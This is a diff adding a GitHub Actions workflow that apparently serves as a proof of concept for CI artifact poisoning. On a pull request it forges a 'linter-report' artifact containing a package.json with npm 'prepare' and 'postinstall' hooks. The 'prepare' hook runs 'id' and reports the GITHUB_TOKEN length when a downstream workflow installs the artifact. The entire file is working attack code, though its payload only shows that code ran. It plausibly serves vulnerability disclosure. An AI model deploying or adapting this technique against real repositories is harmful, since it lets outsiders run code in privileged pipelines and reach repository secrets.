@@ -1,0 +1,28 @@
+name: Lint
+on:
+  pull_request:
+    branches: [main]
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Forge lint artifacts (attacker-controlled)
+        run: |
+          mkdir -p poc
+          echo "POC linter report" > poc/linter-report.txt
+          echo "1" > poc/pr-number.txt
+          cat > poc/package.json <<'PKG'
+          {
+            "name": "poc-root",
+            "version": "1.0.0",
+            "private": true,
+            "scripts": {
+              "prepare": "echo PREPARE_EXECUTED; id; echo TOKEN_LEN=${#GITHUB_TOKEN}",
+              "postinstall": "echo POSTINSTALL_EXECUTED"
+            }
+          }
+          PKG
+      - uses: actions/upload-artifact@v7
+        with:
+          name: linter-report
+          path: poc/*
